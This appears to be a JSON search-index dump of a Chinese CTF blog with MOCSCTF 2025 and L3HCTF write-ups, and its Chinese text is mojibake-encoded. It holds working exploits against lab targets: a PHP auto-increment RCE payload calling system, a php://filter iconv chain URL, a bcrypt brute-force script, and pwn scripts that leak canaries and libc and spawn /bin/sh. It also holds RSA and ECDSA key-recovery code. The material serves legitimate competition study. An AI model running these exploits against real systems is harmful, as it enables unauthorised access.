Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"web ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:2:0","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"shuke-beita è¿™ä¸ªçœŸçš„æ˜¯ç­¾åˆ°äº†xdï¼Œf12è¿›å»å¯ä»¥çœ‹è§ä¸€è¡Œ(document.body.innerHTML = \"è¯·å…³é—­å¼€å‘è€…å·¥å…·ä»¥ç»§ç»­ä½¿ç”¨æœ¬ç½‘ç«™\")ï¼Œæˆ‘ä»¬æ¯”è¾ƒå›é€†ï¼Œç›´æ¥æ‰“å¼€ï¼Œç„¶åè¿è¡Œæ¸¸æˆæŠ“ä¸ªåŒ…ï¼Œf12é‡Œé¢å°±çœ‹è§flagäº†ï¼Œæ— æ•Œäº† ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:2:1","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"ez-rce ä¸ç®—ç‰¹åˆ«éš¾ï¼ŒæŠ“åŒ…å¾—åˆ°\u003c!-- /s3cret/rce.php --\u003eï¼Œè¿›å»å°è¯•rceå³å¯ï¼Œè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ‰“è‡ªå¢ç»•è¿‡ï¼Œè¯¦ç»†åˆ†æçœ‹è¿™ä¸ª å­—ç¬¦æ›´å°‘çš„ç‰ˆæœ¬ $_=[].'_'; //ç©ºæ•°ç»„æ‹¼æ¥ä¸€ä¸ªå­—ç¬¦ï¼Œä¼šå°†ç©ºæ•°ç»„å˜æˆå­—ç¬¦ä¸²Array $__=$_[1];//$__æ˜¯r $_=$_[0];//$_è¿™æ—¶æ˜¯A $_++;//$_è¿™æ—¶æ˜¯Bï¼Œæ¯++ä¸€æ¬¡å°±æ˜¯ä¸‹ä¸€ä¸ªå­—æ¯ $_++;//C $_0=$_;//æŠŠcç»™$_0 $_++;//D $_++;//E $_++;//F $_++;//G $_=$_0.++$_.$__;//$_=CHr $_='_'.$_(71).$_(69).$_(84);//$_='_'.CHR(71).CHR(69).CHR(84) -\u003e $_=_GET //$$_[1]($$_[2]);//$_GET[1]($_GET[2]) echo $_; #_GET å®Œæ•´paylaod /s3cret/rce.php?MOCSCTF2025=%24_%3D%5B%5D.''%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D'_'.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B\u0026_=system\u0026__=cat%20fl49.php ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:2:2","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"ez-pop æ„Ÿè§‰è¿™ä¸ªæ›´ç®€å•ä¸€äº›ï¼Œcomposer.jsonå¯ä»¥æ‰¾åˆ°\"guzzlehttp/guzzle\": \"^7.9\"ï¼Œè¿™é‡Œç›´æ¥æŸ¥è¯¢ ./phpggc -l guzzle Gadget Chains ------------- NAME VERSION TYPE VECTOR I Guzzle/FW1 4.0.0-rc.2 \u003c= 7.5.0+ File write __destruct Guzzle/INFO1 6.0.0 \u003c= 6.3.2 phpinfo() __destruct * Guzzle/RCE1 6.0.0 \u003c= 6.3.2 RCE: Function Call __destruct * Pydio/Guzzle/RCE1 \u003c 8.2.2 RCE: Function Call __toString WordPress/Guzzle/RCE1 4.0.0 \u003c= 6.4.1+ \u0026 WP \u003c 5.5.2 RCE: Function Call __toString * WordPress/Guzzle/RCE2 4.0.0 \u003c= 6.4.1+ \u0026 WP \u003c 5.5.2 RCE: Function Call __destruct * æ‰“WF1å³å¯ï¼Œç„¶åä¸Šä¼  ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:2:3","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"ez-write å‡ºé¢˜äººwp è‡ªå·±å†™çš„æ—¶å€™å‘ç°å¯ä»¥${ }åŒ…è£¹æ‰§è¡Œï¼Œè®¿é—®${include $_GET[1]}å¯ä»¥æ‹¿åˆ°è·¯å¾„ï¼Œç„¶åå‘ç°å¯ä»¥è¯»å–ï¼Œä½†æ˜¯ä¸çŸ¥é“flagåœ¨å“ªé‡Œï¼Œåé¢å…¶å®æ˜ç™½äº†å°±ç®—çŸ¥é“ä¹Ÿä¸è¡Œï¼Œå› ä¸ºæ²¡æœ‰æƒé™ åé¢ç¿»åˆ°äº†é™†é˜Ÿçš„åšå®¢ï¼Œæ‰¾åˆ°äº†PHP Base64 Filterï¼Œåé¢ç»“æŸäº†é˜Ÿå‹è·Ÿæˆ‘è¯´è¿™æ˜¯æµ‹ä¿¡é“æ”»å‡»ï¼Ÿä¸å¤ªæ‡‚xdï¼ŒåºŸäº† http://public-chall-2025.mocsctf.com:31005/tmp/046342ca1db298c5.php?1=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.i","date":"2025-07-17","objectID":"/mocsctf2025-wp/:2:4","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"Crypto å¥½åƒéƒ½æŒºç®€å•çš„ï¼Ÿ ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:3:0","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"ez-matrix è¿™ä¸ªå°±æ˜¯åˆ¤æ–­çŸ©é˜µé‡Œé¢çš„å…ƒç´ å¥½åƒï¼Œç›´æ¥æ“ä¸ªè„šæœ¬å°±è¡Œäº†ï¼Œç•¥äº† ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:3:1","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"ez-learning ç¬¬ä¸€éƒ¨åˆ†ç›´æ¥åˆ†è§£nï¼Œç¬¬äºŒéƒ¨åˆ†è´¹é©¬åˆ†è§£ï¼Œç¬¬ä¸‰éƒ¨åˆ†å°eæ”»å‡»ï¼Œç¬¬å››éƒ¨åˆ†å…±æ¨¡æ”»å‡» ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:3:2","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"ez-klepto æ¯”èµ›æ—¶çš„éé¢„æœŸè§£ Yå¯ä»¥å¼€å¹³æ–¹åˆ†è§£å‡ºæ¥PQï¼Œsçš„æ¢å¤æ–¹æ³•æ˜¯s=pow(n\u003e\u003e1024,d_Y,Y)ï¼Œç„¶ååˆ©ç”¨æ¼æ´æ¢å¤på³å¯p = gmpy2.next_prime(int(sha256(str(s).encode() * 4).hexdigest(), 16)) åé¢æ±‚å‡ºqï¼Œç›´æ¥æ‹¿qç®—å°±è¡Œäº† é¢„æœŸè§£ å®˜æ–¹wpå‡ºæ¥äº†ï¼Œçœ‹äº†ä¸€ä¸‹ï¼ŒåŸæ¥æ˜¯è®ºæ–‡å•Šï¼ŒKleptography: Using Cryptography Against Cryptographyè¿™ä¸ªè®ºæ–‡ï¼Œèµ›æ—¶æ²¡æœ‰æ‰¾åˆ° ç®€å•çš„çœ‹äº†ä¸€ä¸‹ï¼Œä¸éš¾å…¶å®ï¼Œå°±ç›´æ¥æ‰“ï¼Œæ²¡æœ‰é­”æ”¹ä»€ä¹ˆ exp.py from hashlib import sha256 from gmpy2 import * from Crypto.Util.number import * def fermat(num): x = iroot(num, 2)[0] if x * x \u003c num: x += 1 # y^2 = x^2 - num while (True): y2 = x * x - num y = iroot(y2, 2)[0] if y * y == y2: break x += 1 result = [int(x + y), int(x - y)] return result[0] Y = n = c = P = fermat(Y) Q = Y//P assert P * Q == Y d = inverse(65537,(P-1)*(Q-1)) c_s = int(bin(n)[2:1023+2],2) s = pow(c_s,d,Y) p = next_prime(int(sha256(str(s).encode()*4).hexdigest(),16)) if gcd(p,n) \u003e 1: print('get p',p) q = n//p phi = (p-1)*(q-1) d = inverse(65537,phi) print(long_to_bytes(pow(c,d,n)).decode()) é‚£ä¹ˆä¸ºä»€ä¹ˆéé¢„æœŸå¯ä»¥å‘¢ï¼Œå…¶å®å°±æ˜¯ å› ä¸º \\[ \\texttt{tmp} = (c \\ll 1024) + RND, \\] è€Œ \\[ n = \\texttt{tmp} - r, \\] æ‰€ä»¥ \\[ \\frac{n}{2^{1024}} = c + \\frac{RND - r}{2^{1024}}. \\]æ³¨æ„ï¼š \\[ RND \u003c 2^{1024}, \\quad r \u003c p \\approx 2^{512}, \\] å› æ­¤ \\[ |RND - r| \u003c 2^{1024}, \\quad \\frac{RND - r}{2^{1024}} \\in (-1,1). \\]ä¹Ÿå°±æ˜¯è¯´ \\[ \\frac{n}{2^{1024}} = c + \\varepsilon, \\quad \\varepsilon \\in (-1,1). \\]äºæ˜¯ç›´æ¥å–æ•´ï¼š \\[ c \\approx n \\gg 1024, \\] æœ€å¤šå·® 1ï¼ˆå› ä¸ºå¯èƒ½è¿›ä½/å€Ÿä½ï¼‰ï¼Œ è¿™å°±æ˜¯è¯¾ä»¶é‡Œæ‰€è¯´çš„ï¼š â€œthe (-r) operation will not ruin $c$ by more than one bitâ€ã€‚ ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:3:3","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"ez-math å½“æ—¶æ—¶é—´æ¯”è¾ƒç´§ï¼Œaiä¸€æŠŠæ¢­å‡ºæ¥äº†ï¼Œç°åœ¨çœ‹çœ‹ pqç›´æ¥å¼€å¹³æ–¹å‡ºæ¥ï¼Œåé¢çš„å¤„ç†å°±æ˜¯crtäº†xd ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:3:4","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"ez-bcrypt(è¡¥é¢˜) index.php \u003c?php function generate_uuid_v4() { $data = random_bytes(16); $data[6] = chr(ord($data[6]) \u0026 0x0f | 0x40); $data[8] = chr(ord($data[8]) \u0026 0x3f | 0x80); return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4)); } error_reporting(0); ini_set('display_errors', 0); $flag = file_get_contents('/flag.txt'); session_start(); $usernameAdmin = 'admin'; $passwordAdmin = generate_uuid_v4(); $entropy = \"My-password-is-super-secure-that-You'd-never-guess-it-Hia-hiahia\"; if ($_SERVER['REQUEST_METHOD'] === 'POST') { $username = $_POST['username'] ?? ''; $password = $_POST['password'] ?? ''; $hash = password_hash($usernameAdmin . $entropy . $passwordAdmin, PASSWORD_BCRYPT); if ($usernameAdmin === $username \u0026\u0026 password_verify($username . $entropy . $password, $hash)) { $_SESSION['logged_in'] = true; } } ?\u003e è¿™æ˜¯é¢˜ç›®ç»™çš„phpä»£ç ï¼Œå¯ä»¥æ³¨æ„åˆ°å¯†ç ç”¨çš„æ˜¯PASSWORD_BCRYPTï¼Œè¿™ä¸ªæ–¹æ³•ç”¨72é•¿åº¦çš„åŠ å¯†ï¼Œé¢˜ç›®ä¸­çš„entropyæ˜¯69å­—èŠ‚ï¼Œé‚£ä¹ˆ3å­—èŠ‚æ˜¯å¯ä»¥çˆ†ç ´çš„ï¼Œå¤šçº¿ç¨‹çˆ†ç ´å°±è¡Œ import requests import string from concurrent.futures import ThreadPoolExecutor url = \"\" combinations = string.ascii_lowercase + string.digits password = [] for i in combinations: for j in combinations: for k in combinations: password.append(f\"{i}{j}{k}\") def try_password(password_attempt): r = requests.post(url, data={\"username\": \"admin\", \"password\": password_attempt}) if \"MOCSCTF{\" in r.text: return f\"Found flag: {r.text}\" else: return f\"{password_attempt} is not right\" def start_threads(): with ThreadPoolExecutor(max_workers=10) as executor: results = executor.map(try_password, password) for result in results: print(result) if \"Found flag\" in result: exit() if __name__ == '__main__': start_threads() ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:3:5","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"ez-DHKE(è¡¥é¢˜) task.py import numpy as np from Crypto.Cipher import AES import hashlib from Crypto.Util.Padding import pad flag = b'*****' theta = lambda a,b: 1 if a == b else 0 def encrypt(key, iv, plaintext): cipher = AES.new(key, AES.MODE_CBC, iv=iv) return cipher.encrypt(pad(plaintext, 16)).hex() class TPM: def __init__(self, k=3, n=4, l=6, rule=\"rule1\"): self.k = k self.n = n self.l = l self.W = np.random.randint(-l, l + 1, (k, n)) self.rule = rule def forward(self, x): self.x = x.reshape(self.W.shape) self.roe = np.sign(np.sum(self.W * self.x, axis=1)) self.tau = np.prod(self.roe) return self.tau def hebian(self, tau): for (i, j), _ in np.ndenumerate(self.W): self.W[i, j] += self.x[i, j] * self.roe[i] * theta(self.tau, tau) * theta(self.roe[i], self.tau) self.W[i, j] = np.clip(self.W[i, j], -self.l, self.l) def random_walk(self, tau): for (i, j), _ in np.ndenumerate(self.W): self.W[i, j] += self.x[i, j] * theta(self.tau, tau) * theta(self.roe[i], self.tau) self.W[i, j] = np.clip(self.W[i, j], -self.l, self.l) def backward(self, tau): if self.rule == \"rule1\": self.hebian(tau) elif self.rule == \"rule2\": self.random_walk(tau) k, l, n = 8, 10, 10 Alice = TPM(k, n, l, \"rule1\") Bob = TPM(k, n, l, \"rule1\") inputs = [] alice_taus = [] bob_taus = [] for _ in range(999): x = np.random.randint(-27, 28, Alice.n * Alice.k) t1 = Alice.forward(x) t2 = Bob.forward(x) inputs.append(list(x)) alice_taus.append(t1) bob_taus.append(t2) if t1 == t2: Alice.backward(Bob.tau) Bob.backward(Alice.tau) assert np.array_equal(Bob.W, Alice.W) assert Bob.W.shape == (k, n) sha256 = hashlib.sha256() sha256.update(Alice.W.tobytes()) key = sha256.digest() # another one k,l,n = 3, 3, 3 Alice = TPM(k, n, l, \"rule2\") Bob = TPM(k, n, l, \"rule2\") for _ in range(888): x = np.random.randint(-25, 26, Alice.n * Alice.k) t1 = Alice.forward(x) t2 = Bob.forward(x) if t1 == t2: Alice.backward(Bob.tau) Bob.backward(Alice.tau) assert np.array_equal(Bob.W, Alice.W) assert Bob.W.shape == (k, n) sha256 = hashlib.sha256() sha256.update(Alice.W.tobytes()) iv = sha256.digest() ct = encrypt(key, iv[:16], flag) with open(\"output.py\", \"w\") as f: f.write(f\"ct = {ct}\\n\") f.write(f\"inputs = {inputs}\\n\") f.write(f\"alice_taus = {alice_taus}\\n\") f.write(f\"bob_taus = {bob_taus}\\n\") è¿™ä¸ªå‚è€ƒè¿™ä¸ªexpï¼Œæ„Ÿè§‰è‡ªå·±ä¹Ÿç ”ç©¶çš„ä¸æ˜¯å¾ˆæ˜ç™½ï¼ŒåªçŸ¥é“rule1æ˜¯å¯ä»¥ç›´æ¥å›æº¯çš„ï¼Œrule2å› ä¸ºèŒƒå›´æ˜¯3*3ï¼Œä¸”æ¯ä¸ªå€¼çš„èŒƒå›´åœ¨[-3,3]ï¼Œçˆ†ç ´7**9çš„å¯èƒ½å°±è¡Œï¼Œæˆ‘è„šæœ¬ä¸æ˜¯ç‰¹åˆ«ä¼šå†™ï¼Œmdï¼Œä»¥åè¡¥(å’•å’•å’•) ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:3:6","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"Pwn ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:4:0","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"canary æ³„éœ² canary åç›´æ¥ ret2backdoor from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" payload = b\"%11$p\" sl(payload) ru(b\"0x\") canary = int(r(len(\"91bfe76e41f43c00\")), 16) success(hex(canary)) payload = b\"a\" * 0x28 + p(canary) + b\"a\" * 8 + p(0x00000000004006F7) s(payload) ia() ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:4:1","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"Stack æ²¡å¼€PIEå’Œcanaryï¼Œæº¢å‡ºé•¿åº¦è¶³å¤Ÿï¼Œæ³„éœ²libcæ‹¿ä¸ª/bin/shç„¶åç›´æ¥systemå°±è¡Œ from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" puts = 0x0000000000400520 prdi = 0x0000000000400843 sys = 0x0000000000400530 ret = 0x000000000040050E payload = b\"a\" * 0x28 + p(prdi) + p(elf.got[\"puts\"]) + p(puts) + p(0x00000000004006A8) ps() rl() s(payload) base = u(r(6).ljust(8, b\"\\0\")) - 0x80970 success(hex(base)) binsh = base + 0x00000000001B3D88 payload = b\"a\" * 0x28 + p(prdi) + p(binsh) + p(ret) + p(sys) s(payload) ia() ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:4:2","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"fmt éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²è€ƒç‚¹ï¼Œç»™äº†æ— é™æ¬¡fmtæ¬¡æ•°ï¼Œè§‚å¯Ÿæ ˆå‘ç°offsetä¸º13/16çš„åœ°å€æŒ‡å‘offsetä¸º43çš„åœ°å€ï¼Œäºæ˜¯å…ˆæ³„éœ²æ ˆåŸºå€ï¼Œç„¶åæ‰“è¿ç»­æŒ‡é’ˆæ”¹å†™è¿”å›åœ°å€ä¸ºbackdoorå³å¯ from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" # 13 16 43 ru(b\"Input your message: \") sl(b\"%6$p\") ru(b\"0x\") stack = int(r(len(\"7ffd1cf35760\")), 16) - 8 success(hex(stack)) sleep(1) last_four_hex = stack \u0026 0xFFFF print(hex(last_four_hex)[2:]) num = int(hex(last_four_hex)[2:], 16) ru(b\"Input your message: \") sl(b\"%\" + bytes(str(num).encode(\"utf-8\")) + b\"c%13$hn\") ru(b\"Input your message: \") sl(b\"%\" + bytes(str(0x128F).encode(\"utf-8\")) + b\"c%43$hn\") ru(b\"Input your message: \") sl(b\"su str done!\\0a\") ia() ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:4:3","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"Re æˆ‘å‡ºçš„ä¸‰é¢˜éƒ½å¾ˆç®€å•ï¼Œå°±ä¸å†™äº†xd ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:5:0","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"Forensic ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:6:0","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"easysqli é™„ä»¶ç»™äº†ä¸€ä¸ª access.logï¼Œå¯ä»¥çœ‹å‡ºæ¥æ˜¯åœ¨sqlç›²æ³¨ï¼Œå†™ä¸ªè„šæœ¬ import re from urllib.parse import unquote def extract_flag_from_log(log_file): pattern = r'MID\\(.*?,(\\d+),1\\)\\)\\s*([!=\u003e\u003c]+)\\s*(\\d+).*\\).*Rons' position_to_ascii = {} with open(log_file, 'r', encoding='utf-8') as f: for line in f: decoded_line = unquote(line) match = re.search(pattern, decoded_line) if match: position = int(match.group(1)) # å­—ç¬¦ä½ç½® operator = match.group(2) # æ¯”è¾ƒè¿ç®—ç¬¦ value = int(match.group(3)) if operator == '!=': position_to_ascii[position] = value flag = '' for pos in sorted(position_to_ascii.keys()): ascii_value = position_to_ascii[pos] flag += chr(ascii_value) return flag log_file = 'access.log' flag = extract_flag_from_log(log_file) print(f\"Extracted flag: {flag}\") ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:6:1","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"easysword åœ¨CTF-NetAä¸­å‘ç°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè¿›å»å¯ä»¥çŒœå‡ºæ¥æ˜¯CRCçˆ†ç ´ï¼Œç›´æ¥PuzzleSolveä¸€æŠŠæ¢­å°±è¡Œäº† ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:6:2","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"åè¯ cryæœ‰ä¸¤é¢˜ç­‰wpå¤ç°ï¼Œmemé‚£ä¸ªå–è¯æ¯”èµ›çš„æ—¶å€™æ²¡æ‰¾åˆ°hostï¼Œå¯æƒœäº†bro ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:7:0","tags":["crypto"],"title":"Mocsctf2025 Wp","uri":"/mocsctf2025-wp/"},{"categories":["CTF"],"content":"å‰è¨€ å¯†ç è¿™æ¬¡çœŸçš„ç®€å•å§xdï¼Œå½“ä½œè®°å½•å¸–å­äº† ","date":"2025-07-15","objectID":"/l3hctf-wp/:1:0","tags":["crypto"],"title":"L3HCTF Wp","uri":"/l3hctf-wp/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2025-07-15","objectID":"/l3hctf-wp/:2:0","tags":["crypto"],"title":"L3HCTF Wp","uri":"/l3hctf-wp/"},{"categories":["CTF"],"content":"math_problem task.py import gmpy2 from gmpy2 import * from Crypto.Util.number import * from random import randint from gmpy2 import invert from scret import flag def myfunction(num): output = 0 output=num**3 return output if __name__ == '__main__': flag_len = len(flag) p, q = getPrime(512), getPrime(512) while True: r = getPrime(512) R = bytes_to_long(str(r).encode()) if isPrime(R): break n = p * q * r hint1 = R * r mod = myfunction(n) hint2 = pow(3*n+1, p % (2 ** 400), mod) m = bytes_to_long(flag) c = pow(m, 65537, n) print('All data:') print(f'n = {n}') print(f'c = {c}') print(f'hint1 = {hint1}') print(f'hint2 = {hint2}') éé¢„æœŸ GCDæŠŠræ±‚å‡ºæ¥ï¼Œç„¶åç›´æ¥æ±‚è§£ n = c = hint1 = hint2 = from Crypto.Util.number import * r=GCD(hint1,n) print(long_to_bytes(pow(c,inverse(65537,r-1),r))) é¢„æœŸè§£ pè¿™é‡Œåœ¨hint2å¯ä»¥é€šè¿‡äºŒé¡¹å¼å®šç†æ±‚å‡ºä½ä½ $$ hint_2=1+p_l*3n+\\frac{p_l(p_l-1)}{2}(3n)^2 \\mod n^3\\\\ hint_2=1+p_l*3n \\mod n^2 \\\\ p_l=\\frac{hint_2 \\mod n^2 -1}{3n} $$ç„¶åæ‰“copperå°±è¡Œäº† from sage.all import* from Crypto.Util.number import * n = c = hint1 = hint2 = r = GCD(n, hint1) pl = (hint2 % (n^2) - 1) // (3 * n) R.\u003cx\u003e = Zmod(n//r)[] f = x * 2^400 + pl f = f.monic() ph = f.small_roots(X=2^112, beta=0.4)[0] p = ZZ(ph * 2^400 + pl) q = n // (p * r) phi = (p - 1) * (q - 1) * (r - 1) d = inverse(65537, phi) m = pow(c, d, n) print(long_to_bytes(m)) ","date":"2025-07-15","objectID":"/l3hctf-wp/:2:1","tags":["crypto"],"title":"L3HCTF Wp","uri":"/l3hctf-wp/"},{"categories":["CTF"],"content":"EzECDSA task.py import hashlib import random from ecdsa import NIST256p, SigningKey class FlawedNonceGenerator: def __init__(self, n): self.n = n self.a = random.randrange(1, n) self.b = random.randrange(1, n) self.c = random.randrange(1, n) self.last_k = random.randrange(1, n) def generate_nonce(self): current_k = self.last_k next_k = (self.a * current_k**2 + self.b * current_k + self.c) % self.n self.last_k = next_k return current_k curve = NIST256p n = curve.order private_key = SigningKey.from_secret_exponent(random.randrange(1, n), curve=curve) d = private_key.privkey.secret_multiplier public_key = private_key.get_verifying_key() messages = [ b\"Hello player, welcome to L3HCTF 2025!\", b\"This is a crypto challenge, as you can probably tell.\", b\"It's about ECDSA, a very... robust algorithm.\", b\"I'm sure there are no implementation flaws whatsoever.\", b\"Anyway, here are your signatures. Good luck!\", f\"Oh, and the flag is L3HCTF{{{d}}}. Don't tell anyone!\".encode(), ] nonce_generator = FlawedNonceGenerator(n) f = open('signatures.txt', 'w') for i in range(6): k = nonce_generator.generate_nonce() message = messages[i] h = int.from_bytes(hashlib.sha256(message).digest(), 'big') R = k * curve.generator r = R.x() % n s_inv = pow(k, -1, n) s = (s_inv * (h + d * r)) % n f.write(f\"h: {h}, r: {r}, s: {s}\\n\") 